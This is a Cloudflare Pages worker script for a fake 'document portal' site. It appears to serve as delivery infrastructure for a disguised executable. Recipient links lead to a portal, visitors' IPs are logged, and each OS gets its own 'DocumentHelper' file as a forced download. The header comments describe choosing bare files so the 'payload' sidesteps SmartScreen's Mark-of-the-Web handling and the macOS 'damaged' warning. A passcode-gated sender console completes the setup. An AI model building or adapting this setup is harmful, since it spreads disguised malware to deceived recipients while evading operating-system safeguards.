// Cloudflare Pages Functions worker for reyessitework.pages.dev
// Copied into the upload bundle as `_worker.js` by mk-pages-dir.sh.
//
// Routes:
//   /get | /download  -> 302 to the OS-appropriate agent (.exe / .pkg / .run)
//   /dl/<file>        -> force download (Content-Disposition: attachment)
//   /sender           -> PRIVATE sender console (passcode gated), sender.html
//   /f/<code>         -> document portal (index.html); ?to= handled client-side
//   /                 -> business one-pager (about.html)
//   everything else   -> static asset
//
// We hand out the BARE artifacts, not ZIPs. A Windows ZIP puts Mark-of-the-Web on
// the archive and Explorer propagates it to the extracted .exe, so SmartScreen fires
// anyway plus an extraction step. A macOS ZIP strips the exec bit and routinely
// reports the ad-hoc-signed payload as "damaged and can't be opened". A .pkg and a
// signed .exe are both double-clickable, so no archive is needed.
//
// Sender passcode: set the Pages env var SENDER_KEY (plaintext) in the dashboard,
// or change DEFAULT_SENDER_KEY below. Recipients never see the sender console.

const DEFAULT_SENDER_KEY = 'reyes-sender-2026';

function getCookie(req, name) {
  const c = req.headers.get('cookie') || '';
  const m = c.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));
  return m ? decodeURIComponent(m[1]) : '';
}

function loginPage(message) {
  const html = `<!DOCTYPE html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow"><title>Sender Console — Locked</title>
<style>
*{box-sizing:border-box;margin:0}
body{min-height:100vh;display:flex;align-items:center;justify-content:center;
background:radial-gradient(1000px 640px at 82% -10%,rgba(139,92,246,.26),transparent 60%),
radial-gradient(900px 600px at 8% 110%,rgba(8,145,178,.30),transparent 60%),
linear-gradient(180deg,#04070f,#060b16 55%,#04070f);
font:15.5px/1.55 "Rajdhani",-apple-system,"Segoe UI",Roboto,sans-serif;color:#dbeafe;padding:24px}
.card{background:linear-gradient(160deg,rgba(12,20,38,.88),rgba(6,11,22,.92));
border:1px solid rgba(94,234,212,.38);border-radius:18px;max-width:380px;width:100%;padding:28px;
box-shadow:0 30px 90px rgba(0,0,0,.7),inset 0 1px 0 rgba(255,255,255,.05)}
h1{font-family:"Orbitron","Segoe UI",sans-serif;font-size:17px;font-weight:800;margin-bottom:6px}
p.lede{color:#7dd3fc;font-size:13.5px;margin-bottom:18px}
input{width:100%;background:rgba(2,6,14,.8);border:1px solid rgba(94,234,212,.38);border-radius:9px;
color:#e0f2fe;padding:12px 13px;font-size:15px;font-family:inherit;margin-bottom:12px}
input:focus{outline:none;border-color:#22d3ee;box-shadow:0 0 0 2px rgba(34,211,238,.25)}
button{width:100%;padding:13px;border:0;border-radius:10px;color:#03131b;cursor:pointer;
font:700 13px/1 "Orbitron",sans-serif;letter-spacing:.14em;text-transform:uppercase;
background:linear-gradient(180deg,#22d3ee,#0ea5e9);box-shadow:0 6px 26px rgba(34,211,238,.35)}
.msg{color:#fecdd3;font-size:13px;margin-top:12px}
</style></head><body>
<form class="card" method="POST" action="/sender">
  <h1>Sender Console</h1>
  <p class="lede">Private area. Enter the access code.</p>
  <input type="password" name="pass" placeholder="Access code" autocomplete="current-password" autofocus>
  <button type="submit">Unlock</button>
  ${message ? `<p class="msg">${message}</p>` : ''}
</form></body></html>`;
  return new Response(html, {
    status: message ? 401 : 200,
    headers: { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' }
  });
}

export default {
  async fetch(req, env) {
    const ua = req.headers.get('user-agent') || '';
    const u = new URL(req.url);
    const p = u.pathname;

    // --- Private sender console (passcode gated) ---
    if (p === '/sender' || p === '/s') {
      const key = env.SENDER_KEY || DEFAULT_SENDER_KEY;
      if (u.searchParams.get('logout')) {
        return new Response(null, {
          status: 303,
          headers: {
            Location: '/sender',
            'Set-Cookie': 'sk=; Path=/; Max-Age=0; HttpOnly; Secure; SameSite=Strict',
            'Cache-Control': 'no-store'
          }
        });
      }
      if (req.method === 'POST') {
        let pass = '';
        try { const f = await req.formData(); pass = String(f.get('pass') || ''); } catch (e) {}
        if (pass === key) {
          return new Response(null, {
            status: 303,
            headers: {
              Location: '/sender',
              'Set-Cookie': 'sk=' + encodeURIComponent(key) + '; Path=/; Max-Age=2592000; HttpOnly; Secure; SameSite=Strict',
              'Cache-Control': 'no-store'
            }
          });
        }
        return loginPage('Incorrect access code.');
      }
      if (getCookie(req, 'sk') === key) {
        return env.ASSETS.fetch(new URL('/sender.html', u));
      }
      return loginPage('');
    }

    // --- OS-aware agent download ---
    if (p === '/get' || p === '/download') {
      const f = /Windows/i.test(ua)            ? 'DocumentHelper.exe'
              : /Macintosh|Mac OS X/i.test(ua) ? 'DocumentHelper.pkg'
              : /Linux|X11/i.test(ua)          ? 'DocumentHelper.run'
              : 'DocumentHelper.exe';
      console.log(JSON.stringify({
        ts: Date.now(), ip: req.headers.get('cf-connecting-ip'),
        ua, file: f, path: p
      }));
      return new Response(null, {
        status: 302,
        headers: { Location: '/dl/' + f, 'Cache-Control': 'no-store' }
      });
    }

    if (p.startsWith('/dl/')) {
      const r = await env.ASSETS.fetch(req);
      const h = new Headers(r.headers);
      h.set('Content-Disposition', 'attachment');
      h.set('X-Content-Type-Options', 'nosniff');
      h.set('Cache-Control', 'no-store');
      return new Response(r.body, { status: r.status, headers: h });
    }

    // --- Recipient document portal ---
    if (/^\/f\/[A-Za-z0-9_-]+$/.test(p)) {
      return env.ASSETS.fetch(new URL('/index.html', u));
    }

    if (p === '/') {
      return env.ASSETS.fetch(new URL('/about.html', u));
    }

    return env.ASSETS.fetch(req);
  }
};
